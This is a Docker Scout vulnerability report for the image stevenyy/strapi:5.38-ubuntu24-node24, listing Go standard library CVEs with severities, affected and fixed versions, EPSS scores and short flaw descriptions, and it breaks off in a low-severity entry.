<h2>:mag: Vulnerabilities of <code>stevenyy/strapi:5.38-ubuntu24-node24</code></h2>

<details open="true"><summary>:package: Image Reference</strong> <code>stevenyy/strapi:5.38-ubuntu24-node24</code></summary>
<table>
<tr><td>digest</td><td><code>sha256:bcea0dab4f4b4009ed178c1bed316d04e230225cb5159082c0e330c6a6cd7547</code></td><tr><tr><td>vulnerabilities</td><td><img alt="critical: 4" src="https://img.shields.io/badge/critical-4-8b1924"/> <img alt="high: 27" src="https://img.shields.io/badge/high-27-e25d68"/> <img alt="medium: 105" src="https://img.shields.io/badge/medium-105-fbb552"/> <img alt="low: 32" src="https://img.shields.io/badge/low-32-fce1a9"/> <!-- unspecified: 0 --></td></tr>
<tr><td>platform</td><td>linux/arm64</td></tr>
<tr><td>size</td><td>275 MB</td></tr>
<tr><td>packages</td><td>1898</td></tr>
</table>
</details></table>
</details>

<table>
<tr><td valign="top">
<details><summary><img alt="critical: 3" src="https://img.shields.io/badge/C-3-8b1924"/> <img alt="high: 12" src="https://img.shields.io/badge/H-12-e25d68"/> <img alt="medium: 21" src="https://img.shields.io/badge/M-21-fbb552"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>stdlib</strong> <code>1.20.12</code> (golang)</summary>

<small><code>pkg:golang/stdlib@1.20.12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-68121?s=golang&n=stdlib&t=golang&vr=%3C1.24.13"><img alt="critical : CVE--2025--68121" src="https://img.shields.io/badge/CVE--2025--68121-lightgrey?label=critical%20&labelColor=8b1924"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.13</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.13</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.016%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>3rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

During session resumption in crypto/tls, if the underlying Config has its ClientCAs or RootCAs fields mutated between the initial handshake and the resumed handshake, the resumed handshake may succeed when it should have failed. This may happen when a user calls Config.Clone and mutates the returned Config, or uses Config.GetConfigForClient. This can cause a client to resume a session with a server that it would not have resumed with during the initial handshake, or cause a server to resume a session with a client that it would not have resumed with during the initial handshake.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-24790?s=golang&n=stdlib&t=golang&vr=%3C1.21.11"><img alt="critical : CVE--2024--24790" src="https://img.shields.io/badge/CVE--2024--24790-lightgrey?label=critical%20&labelColor=8b1924"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.21.11</code></td></tr>
<tr><td>Fixed version</td><td><code>1.21.11</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.082%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>24th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The various Is methods (IsPrivate, IsLoopback, etc) did not work as expected for IPv4-mapped IPv6 addresses, returning false for addresses which would return true in their traditional IPv4 forms.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-22871?s=golang&n=stdlib&t=golang&vr=%3C1.23.8"><img alt="critical : CVE--2025--22871" src="https://img.shields.io/badge/CVE--2025--22871-lightgrey?label=critical%20&labelColor=8b1924"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.23.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.23.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.169%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>38th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The net/http package improperly accepts a bare LF as a line terminator in chunked data chunk-size lines. This can permit request smuggling if a net/http server is used in conjunction with a server that incorrectly accepts a bare LF as part of a chunk-ext.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-61729?s=golang&n=stdlib&t=golang&vr=%3C1.24.11"><img alt="high : CVE--2025--61729" src="https://img.shields.io/badge/CVE--2025--61729-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.11</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.11</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.017%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Within HostnameError.Error(), when constructing an error string, there is no limit to the number of hosts that will be printed out. Furthermore, the error string is constructed by repeated string concatenation, leading to quadratic runtime. Therefore, a certificate provided by a malicious actor can result in excessive resource consumption.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-61726?s=golang&n=stdlib&t=golang&vr=%3C1.24.12"><img alt="high : CVE--2025--61726" src="https://img.shields.io/badge/CVE--2025--61726-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.12</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.12</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.029%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>8th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The net/url package does not set a limit on the number of query parameters in a query.

While the maximum size of query parameters in URLs is generally limited by the maximum request header size, the net/http.Request.ParseForm method can parse large URL-encoded forms. Parsing a large form containing many unique query parameters can cause excessive memory consumption.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-61725?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="high : CVE--2025--61725" src="https://img.shields.io/badge/CVE--2025--61725-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.032%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>9th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The ParseAddress function constructs domain-literal address components through repeated string concatenation. When parsing large domain-literal components, this can cause excessive CPU consumption.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-61723?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="high : CVE--2025--61723" src="https://img.shields.io/badge/CVE--2025--61723-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.040%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>12th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The processing time for parsing some invalid inputs scales non-linearly with respect to the size of the input.

This affects programs which parse untrusted PEM inputs.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-58188?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="high : CVE--2025--58188" src="https://img.shields.io/badge/CVE--2025--58188-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.019%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>5th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Validating certificate chains which contain DSA public keys can cause programs to panic, due to a interface cast that assumes they implement the Equal method.

This affects programs which validate arbitrary certificate chains.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-58187?s=golang&n=stdlib&t=golang&vr=%3C1.24.9"><img alt="high : CVE--2025--58187" src="https://img.shields.io/badge/CVE--2025--58187-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.9</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.9</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.019%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>5th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Due to the design of the name constraint checking algorithm, the processing time of some inputs scale non-linearly with respect to the size of the certificate.

This affects programs which validate arbitrary certificate chains.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-34158?s=golang&n=stdlib&t=golang&vr=%3C1.22.7"><img alt="high : CVE--2024--34158" src="https://img.shields.io/badge/CVE--2024--34158-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.22.7</code></td></tr>
<tr><td>Fixed version</td><td><code>1.22.7</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.163%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>37th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Calling Parse on a "// +build" build tag line with deeply nested expressions can cause a panic due to stack exhaustion.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-34156?s=golang&n=stdlib&t=golang&vr=%3C1.22.7"><img alt="high : CVE--2024--34156" src="https://img.shields.io/badge/CVE--2024--34156-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.22.7</code></td></tr>
<tr><td>Fixed version</td><td><code>1.22.7</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.298%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>53rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Calling Decoder.Decode on a message which contains deeply nested structures can cause a panic due to stack exhaustion. This is a follow-up to CVE-2022-30635.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-24791?s=golang&n=stdlib&t=golang&vr=%3C1.21.12"><img alt="high : CVE--2024--24791" src="https://img.shields.io/badge/CVE--2024--24791-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.21.12</code></td></tr>
<tr><td>Fixed version</td><td><code>1.21.12</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.618%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>70th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The net/http HTTP/1.1 client mishandled the case where a server responds to a request with an "Expect: 100-continue" header with a non-informational (200 or higher) status. This mishandling could leave a client connection in an invalid state, where the next request sent on the connection will fail.

An attacker sending a request to a net/http/httputil.ReverseProxy proxy can exploit this mishandling to cause a denial of service by sending "Expect: 100-continue" requests which elicit a non-informational response from the backend. Each such request leaves the proxy with an invalid connection, and causes one subsequent request using that connection to fail.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-24784?s=golang&n=stdlib&t=golang&vr=%3C1.21.8"><img alt="high : CVE--2024--24784" src="https://img.shields.io/badge/CVE--2024--24784-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.21.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.21.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.498%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>81st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The ParseAddressList function incorrectly handles comments (text within parentheses) within display names. Since this is a misalignment with conforming address parsers, it can result in different trust decisions being made by programs using different parsers.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-45288?s=golang&n=stdlib&t=golang&vr=%3C1.21.9"><img alt="high : CVE--2023--45288" src="https://img.shields.io/badge/CVE--2023--45288-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.21.9</code></td></tr>
<tr><td>Fixed version</td><td><code>1.21.9</code></td></tr>
<tr><td>EPSS Score</td><td><code>71.463%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>99th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An attacker may cause an HTTP/2 endpoint to read arbitrary amounts of header data by sending an excessive number of CONTINUATION frames.

Maintaining HPACK state requires parsing and processing all HEADERS and CONTINUATION frames on a connection. When a request's headers exceed MaxHeaderBytes, no memory is allocated to store the excess headers, but they are still parsed.

This permits an attacker to cause an HTTP/2 endpoint to read arbitrary amounts of header data, all associated with a request which is going to be rejected. These headers can include Huffman-encoded data which is significantly more expensive for the receiver to decode than for an attacker to send.

The fix sets a limit on the amount of excess header frames we will process before closing a connection.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2022-30635?s=golang&n=stdlib&t=golang&vr=%3C1.22.7"><img alt="high : CVE--2022--30635" src="https://img.shields.io/badge/CVE--2022--30635-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.22.7</code></td></tr>
<tr><td>Fixed version</td><td><code>1.22.7</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.096%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>27th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Calling Decoder.Decode on a message which contains deeply nested structures can cause a panic due to stack exhaustion. This is a follow-up to CVE-2022-30635.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-4673?s=golang&n=stdlib&t=golang&vr=%3C1.23.10"><img alt="medium : CVE--2025--4673" src="https://img.shields.io/badge/CVE--2025--4673-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.23.10</code></td></tr>
<tr><td>Fixed version</td><td><code>1.23.10</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.017%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Proxy-Authorization and Proxy-Authenticate headers persisted on cross-origin redirects potentially leaking sensitive information.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-61728?s=golang&n=stdlib&t=golang&vr=%3C1.24.12"><img alt="medium : CVE--2025--61728" src="https://img.shields.io/badge/CVE--2025--61728-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.12</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.12</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.018%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

archive/zip uses a super-linear file name indexing algorithm that is invoked the first time a file in an archive is opened. This can lead to a denial of service when consuming a maliciously constructed ZIP archive.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-61727?s=golang&n=stdlib&t=golang&vr=%3C1.24.11"><img alt="medium : CVE--2025--61727" src="https://img.shields.io/badge/CVE--2025--61727-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.11</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.11</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.011%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An excluded subdomain constraint in a certificate chain does not restrict the usage of wildcard SANs in the leaf certificate. For example a constraint that excludes the subdomain test.example.com does not prevent a leaf certificate from claiming the SAN *.example.com.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-47906?s=golang&n=stdlib&t=golang&vr=%3C1.23.12"><img alt="medium : CVE--2025--47906" src="https://img.shields.io/badge/CVE--2025--47906-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.23.12</code></td></tr>
<tr><td>Fixed version</td><td><code>1.23.12</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.028%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>8th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

If the PATH environment variable contains paths which are executables (rather than just directories), passing certain strings to LookPath ("", ".", and ".."), can result in the binaries listed in the PATH being unexpectedly returned.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-45290?s=golang&n=stdlib&t=golang&vr=%3C1.21.8"><img alt="medium : CVE--2023--45290" src="https://img.shields.io/badge/CVE--2023--45290-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.21.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.21.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.362%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>58th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When parsing a multipart form (either explicitly with Request.ParseMultipartForm or implicitly with Request.FormValue, Request.PostFormValue, or Request.FormFile), limits on the total size of the parsed form were not applied to the memory consumed while reading a single form line. This permits a maliciously crafted input containing very long lines to cause allocation of arbitrarily large amounts of memory, potentially leading to memory exhaustion.

With fix, the ParseMultipartForm function now correctly limits the maximum size of form lines.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-45341?s=golang&n=stdlib&t=golang&vr=%3C1.22.11"><img alt="medium : CVE--2024--45341" src="https://img.shields.io/badge/CVE--2024--45341-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.22.11</code></td></tr>
<tr><td>Fixed version</td><td><code>1.22.11</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.119%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>31st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A certificate with a URI which has a IPv6 address with a zone ID may incorrectly satisfy a URI name constraint that applies to the certificate chain.

Certificates containing URIs are not permitted in the web PKI, so this only affects users of private PKIs which make use of URIs.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-45336?s=golang&n=stdlib&t=golang&vr=%3C1.22.11"><img alt="medium : CVE--2024--45336" src="https://img.shields.io/badge/CVE--2024--45336-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.22.11</code></td></tr>
<tr><td>Fixed version</td><td><code>1.22.11</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.142%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>34th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The HTTP client drops sensitive headers after following a cross-domain redirect. For example, a request to a.com/ containing an Authorization header which is redirected to b.com/ will not send that header to b.com.

In the event that the client received a subsequent same-domain redirect, however, the sensitive headers would be restored. For example, a chain of redirects from a.com/, to b.com/1, and finally to b.com/2 would incorrectly send the Authorization header to b.com/2.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-24783?s=golang&n=stdlib&t=golang&vr=%3C1.21.8"><img alt="medium : CVE--2024--24783" src="https://img.shields.io/badge/CVE--2024--24783-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.21.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.21.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.445%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>63rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Verifying a certificate chain which contains a certificate with an unknown public key algorithm will cause Certificate.Verify to panic.

This affects all crypto/tls clients, and servers that set Config.ClientAuth to VerifyClientCertIfGiven or RequireAndVerifyClientCert. The default behavior is for TLS servers to not verify client certificates.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-0913?s=golang&n=stdlib&t=golang&vr=%3C1.23.10"><img alt="medium : CVE--2025--0913" src="https://img.shields.io/badge/CVE--2025--0913-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.23.10</code></td></tr>
<tr><td>Fixed version</td><td><code>1.23.10</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.013%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

os.OpenFile(path, os.O_CREATE|O_EXCL) behaved differently on Unix and Windows systems when the target path was a dangling symlink. On Unix systems, OpenFile with O_CREATE and O_EXCL flags never follows symlinks. On Windows, when the target path was a symlink to a nonexistent location, OpenFile would create a file in that location. OpenFile now always returns an error when the O_CREATE and O_EXCL flags are both set and the target path is a symlink.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-24789?s=golang&n=stdlib&t=golang&vr=%3C1.21.11"><img alt="medium : CVE--2024--24789" src="https://img.shields.io/badge/CVE--2024--24789-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.21.11</code></td></tr>
<tr><td>Fixed version</td><td><code>1.21.11</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.007%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>0th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The archive/zip package's handling of certain types of invalid zip files differs from the behavior of most zip implementations. This misalignment could be exploited to create an zip file with contents that vary depending on the implementation reading the file. The archive/zip package now rejects files containing these errors.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-24785?s=golang&n=stdlib&t=golang&vr=%3C1.21.8"><img alt="medium : CVE--2024--24785" src="https://img.shields.io/badge/CVE--2024--24785-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.21.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.21.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.232%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>46th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

If errors returned from MarshalJSON methods contain user controlled data, they may be used to break the contextual auto-escaping behavior of the html/template package, allowing for subsequent actions to inject unexpected content into templates.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-61730?s=golang&n=stdlib&t=golang&vr=%3C1.24.12"><img alt="medium : CVE--2025--61730" src="https://img.shields.io/badge/CVE--2025--61730-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.12</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.12</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.010%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

During the TLS 1.3 handshake if multiple messages are sent in records that span encryption level boundaries (for instance the Client Hello and Encrypted Extensions messages), the subsequent messages may be processed before the encryption level changes. This can cause some minor information disclosure if a network-local attacker can inject messages during the handshake.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-61724?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="medium : CVE--2025--61724" src="https://img.shields.io/badge/CVE--2025--61724-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.023%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The Reader.ReadResponse function constructs a response string through repeated string concatenation of lines. When the number of lines in a response is large, this can cause excessive CPU consumption.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-58189?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="medium : CVE--2025--58189" src="https://img.shields.io/badge/CVE--2025--58189-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.016%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>3rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When Conn.Handshake fails during ALPN negotiation the error contains attacker controlled information (the ALPN protocols sent by the client) which is not escaped.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-58186?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="medium : CVE--2025--58186" src="https://img.shields.io/badge/CVE--2025--58186-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.031%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>9th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Despite HTTP headers having a default limit of 1MB, the number of cookies that can be parsed does not have a limit. By sending a lot of very small cookies such as "a=;", an attacker can make an HTTP server allocate a large amount of structs, causing large memory consumption.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-58185?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="medium : CVE--2025--58185" src="https://img.shields.io/badge/CVE--2025--58185-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.033%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>9th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Parsing a maliciously crafted DER payload could allocate large amounts of memory, causing memory exhaustion.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-47912?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="medium : CVE--2025--47912" src="https://img.shields.io/badge/CVE--2025--47912-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.032%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>9th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The Parse function permits values other than IPv6 addresses to be included in square brackets within the host component of a URL. RFC 3986 permits IPv6 addresses to be included within the host component, enclosed within square brackets. For example: "http://[::1]/". IPv4 addresses and hostnames must not appear within square brackets. Parse did not enforce this requirement.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-58183?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="medium : CVE--2025--58183" src="https://img.shields.io/badge/CVE--2025--58183-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.020%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>5th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

tar.Reader does not set a maximum size on the number of sparse region data blocks in GNU tar pax 1.0 sparse files. A maliciously-crafted archive containing a large number of sparse regions can cause a Reader to read an unbounded amount of data from the archive into memory. When reading from a compressed source, a small compressed input can result in large allocations.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-34155?s=golang&n=stdlib&t=golang&vr=%3C1.22.7"><img alt="medium : CVE--2024--34155" src="https://img.shields.io/badge/CVE--2024--34155-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.22.7</code></td></tr>
<tr><td>Fixed version</td><td><code>1.22.7</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.081%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>24th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Calling any of the Parse functions on Go source code which contains deeply nested literals can cause a panic due to stack exhaustion.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-45289?s=golang&n=stdlib&t=golang&vr=%3C1.21.8"><img alt="medium : CVE--2023--45289" src="https://img.shields.io/badge/CVE--2023--45289-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.21.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.21.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.454%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>64th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When following an HTTP redirect to a domain which is not a subdomain match or exact match of the initial domain, an http.Client does not forward sensitive headers such as "Authorization" or "Cookie". For example, a redirect from foo.com to www.foo.com will forward the Authorization header, but a redirect to bar.com will not.

A maliciously crafted HTTP redirect could cause sensitive headers to be unexpectedly forwarded.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-22866?s=golang&n=stdlib&t=golang&vr=%3C1.22.12"><img alt="medium : CVE--2025--22866" src="https://img.shields.io/badge/CVE--2025--22866-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.22.12</code></td></tr>
<tr><td>Fixed version</td><td><code>1.22.12</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.040%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>12th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Due to the usage of a variable time instruction in the assembly implementation of an internal function, a small number of bits of secret scalars are leaked on the ppc64le architecture. Due to the way this function is used, we do not believe this leakage is enough to allow recovery of the private key when P-256 is used in any well known protocols.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-22873?s=golang&n=stdlib&t=golang&vr=%3C1.23.9"><img alt="low : CVE--2025--22873" src="https://img.shields.io/badge/CVE--2025--22873-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.23.9</code></td></tr>
<tr><td>Fixed version</td><td><code>1.23.9</code></td></tr>
